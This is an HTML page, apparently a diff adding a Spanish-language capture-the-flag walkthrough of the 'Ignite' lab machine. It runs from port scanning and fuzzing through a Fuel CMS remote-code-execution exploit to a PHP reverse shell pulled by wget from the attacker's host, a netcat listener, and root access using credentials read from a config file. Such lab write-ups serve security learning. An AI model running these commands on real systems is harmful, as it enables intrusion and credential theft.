@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+      <link rel="shortcut icon" href="../img/favicon.ico" />
+    <title>21 - Ignite - MkLorum</title>
+    <link rel="stylesheet" href="../css/theme.css" />
+    <link rel="stylesheet" href="../css/theme_extra.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github.min.css" />
+    
+      <script>
+        // Current page data
+        var mkdocs_page_name = "21 - Ignite";
+        var mkdocs_page_input_path = "21-IGNITE.md";
+        var mkdocs_page_url = null;
+      </script>
+    
+    <!--[if lt IE 9]>
+      <script src="../js/html5shiv.min.js"></script>
+    <![endif]-->
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+      <script>hljs.highlightAll();</script> 
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+    <div class="wy-side-scroll">
+      <div class="wy-side-nav-search">
+          <a href=".." class="icon icon-home"> MkLorum
+        </a><div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="../search.html" method="get">
+      <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" title="Type search term here" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="..">Home</a>
+                </li>
+              </ul>
+      </div>
+    </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+      <nav class="wy-nav-top" role="navigation" aria-label="Mobile navigation menu">
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="..">MkLorum</a>
+        
+      </nav>
+      <div class="wy-nav-content">
+        <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href=".." class="icon icon-home" aria-label="Docs"></a></li>
+      <li class="breadcrumb-item active">21 - Ignite</li>
+    <li class="wy-breadcrumbs-aside">
+    </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+            <div class="section" itemprop="articleBody">
+              
+                <h1 id="21-ignite">21 - Ignite</h1>
+<h2 id="procesos">Procesos</h2>
+<h3 id="escanear-puertos">Escanear puertos</h3>
+<pre><code>sudo nmap -sV &lt;SERVICE_VERSION&gt; -O &lt;OS&gt; -T4 &lt;INTENSIDAD&gt; &lt;IP&gt;
+</code></pre>
+<pre><code>sudo nmap -sV -O -T4 10.10.56.241
+</code></pre>
+<ul>
+<li>
+<p><code>-sV</code>: 80/tcp open http Apache httpd 2.4.18 ((Ubuntu))</p>
+</li>
+<li>
+<p><code>-O</code>: No exact OS matches for host (If you know what OS is running on it, see <a href="https://nmap.org/submit/">Nmap OS submission</a>).</p>
+</li>
+<li>
+<p><code>-T4</code>: En un rango de 1 a 5 lo agresivo (ruidoso) que quieres que sea el escaneo</p>
+</li>
+</ul>
+<h3 id="fuzzear">Fuzzear</h3>
+<pre><code>feroxbuster -u &lt;URL&gt; -t &lt;THREADS&gt; -L &lt;SCAN_LIMIT&gt; -n &lt;NO_RECURSION&gt; -w &lt;WORD_LIST&gt; -o &lt;OUTPUT&gt;
+</code></pre>
+<pre><code>feroxbuster -u http://10.10.172.69:80 -t 5 -L 5 -n -w /home/kali/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -o outputIgnite.txt
+</code></pre>
+<h3 id="revisar-pagina-web">Revisar pagina web</h3>
+<ul>
+<li><code>Robot.txt</code></li>
+</ul>
+<pre><code>User-agent: *
+Disallow: /fuel/
+</code></pre>
+<ul>
+<li><code>/fuel</code> (Login page)</li>
+</ul>
+<p>user: admin
+password: admin</p>
+<ul>
+<li>Buscar vunerabilidades</li>
+</ul>
+<pre><code>searchsploit &lt;SERVICE&gt;
+</code></pre>
+<pre><code>searchsploit fuel
+
+&gt; ------------------------------- ---------------------------------
+    Exploit Title                   |  Path
+--------------------------------- ---------------------------------
+AMD Fuel Service - 'Fuel.service | windows/local/49535.txt
+Franklin Fueling Systems  TS-550 | hardware/remote/51321.txt
+Franklin Fueling Systems Colibri | linux/remote/50861.txt
+Franklin Fueling Systems TS-550  | hardware/remote/51382.txt
+Franklin Fueling TS-550 evo 2.0. | hardware/webapps/31180.txt
+fuel CMS 1.4.1 - Remote Code Exe | linux/webapps/47138.py
+Fuel CMS 1.4.1 - Remote Code Exe | php/webapps/49487.rb
+Fuel CMS 1.4.1 - Remote Code Exe | php/webapps/50477.py
+Fuel CMS 1.4.13 - 'col' Blind SQ | php/webapps/50523.txt
+Fuel CMS 1.4.7 - 'col' SQL Injec | php/webapps/48741.txt
+Fuel CMS 1.4.8 - 'fuel_replace_i | php/webapps/48778.txt
+Fuel CMS 1.5.0 - Cross-Site Requ | php/webapps/50884.txt
+--------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre>
+<ul>
+<li>
+<p>Explotar vulnerabilidad</p>
+</li>
+<li>
+<p>Descargar exploit y acceder a la shell</p>
+</li>
+</ul>
+<p><a href="https://www.exploit-db.com/exploits/50477">https://www.exploit-db.com/exploits/50477</a></p>
+<p><code>python3 50477.py -u http://10.10.172.69</code></p>
+<ol>
+<li>Una vez accedido a la shell:</li>
+</ol>
+<p>```
+   cat /home/www-data/flag.txt</p>
+<blockquote>
+<p>6470e394cbf6dab6a91682cc8585059b
+   ```</p>
+</blockquote>
+<ol>
+<li>
+<p>Mejorar la shell (Reverse shell):</p>
+</li>
+<li>
+<p>Descargar y descomprimir:</p>
+<p>```
+  wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz</p>
+<p>tar -xvzf php-reverse-shell-1.0.tar.gz
+  ```</p>
+</li>
+<li>
+<p>Levantar web server en el directorio de la reverse shell para pasarla a la maquina objetivo:</p>
+<p><code>python3 -m http.server 80</code></p>
+</li>
+<li>
+<p>Conectarme al servidor desde la maquina objetivo:</p>
+<p><code>wget http://10.21.104.33/shell.php</code></p>
+</li>
+<li>
+<p>Mejorar shell:</p>
+<p><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></p>
+</li>
+<li>
+<p>Escuchar desde mi maquina con netcat:</p>
+<p><code>netcat -nvlp 8085</code></p>
+</li>
+<li>
+<p>Cargar la sell en el navegador: <a href="http://10.10.172.69/shell.php">http://10.10.172.69/shell.php</a></p>
+</li>
+<li>
+<p>Hacernos root:</p>
+</li>
+<li>
+<p>Buscar archivo de configuracion:</p>
+<p><code>cd /var/www/html/fuel/application/config</code></p>
+</li>
+<li>
+<p>Conseguir credenciales root e identidicarnos como root:</p>
+<p>```
+  cat database.php</p>
+<blockquote>
+<p>user: root
+  password: mememe
+  ```</p>
+</blockquote>
+<p><code>su root</code></p>
+</li>
+<li>
+<p>Acceder al directorio root (previamente oculto) y conseguir la flag:</p>
+<p><code>cd /
+  cd root</code></p>
+<p>```
+  cat root.txt</p>
+<blockquote>
+<p>b9bbcb33e11b80be759c4e844862482d
+  ```</p>
+</blockquote>
+</li>
+</ol>
+              
+            </div>
+          </div><footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+  </div>
+
+  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+          
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" aria-label="Versions">
+  <span class="rst-current-version" data-toggle="rst-current-version">
+    
+    
+    
+  </span>
+</div>
+    <script src="../js/jquery-3.6.0.min.js"></script>
+    <script>var base_url = "..";</script>
+    <script src="../js/theme_extra.js"></script>
+    <script src="../js/theme.js"></script>
+      <script src="../search/main.js"></script>
+    <script>
+        jQuery(function () {
+            SphinxRtdTheme.Navigation.enable(true);
+        });
+    </script>
+
+</body>
+</html>
